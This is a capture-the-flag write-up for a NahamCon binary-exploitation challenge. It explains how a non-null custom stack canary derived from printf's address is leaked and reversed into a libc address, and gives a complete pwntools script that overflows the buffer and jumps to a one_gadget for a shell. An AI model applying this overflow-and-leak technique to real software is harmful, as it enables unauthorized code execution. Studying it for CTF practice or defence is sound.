Code:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  setup(argc, argv, envp);
  v5 = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
  saved_canary = (unsigned __int64)&printf ^ 0x123456789ABCDEF1LL;
  memset(s, 0, sizeof(s));
  puts("Do you think you can overflow me?");
  read(0, s, 0x40uLL);
  puts(s);
  memset(s, 0, sizeof(s));
  puts("Are you sure you overflowed it right? Try again.");
  read(0, s, 0x40uLL);
  if ( v5 != saved_canary )
  {
    puts("Nope. :(");
    exit(0);
  }
  return 0;
}
```
There is an obvious buffer overflow here. in order to make it harder to exploit, the binary implements some kind of stack canary to defend the return pointer.
it takes printf libc address, and xors it with 0x123456789abcdef1, and stores is right after our buffer.
BUT, unlike normal stack canaries, this canary doesn't starts with a null byte. this means we can print it.
We can enter 40 bytes, and then we'll reach the canary, and the puts will print the all 40 bytes + canary, until it tackles a null byte:
```
p.send('a' * 40)
p.recvuntil('a' * 40)

canary = u64(p.recvn(8))
print(hex(canary))
```
Now we are promted to another buffer overflow. we can now xor the canary with 0x123456789abcdef1, and retrieve printf address, and get a libc leak.
then we can just jump to a one_gadget and win.

```py
from pwn import *
p = remote('challenge.nahamcon.com', 32735)

p.recvuntil('me?')
p.send('a' * 40)

p.recvuntil('a' * 40)

canary = u64(p.recvn(8))

libc = (canary ^ 0x123456789abcdef1) - 0x64f70

p.recvuntil('again.')

p.sendline(40 * b'A' + p64(canary) + b'b' * 8 + p64(libc + 0x10a41c))

p.interactive()
```
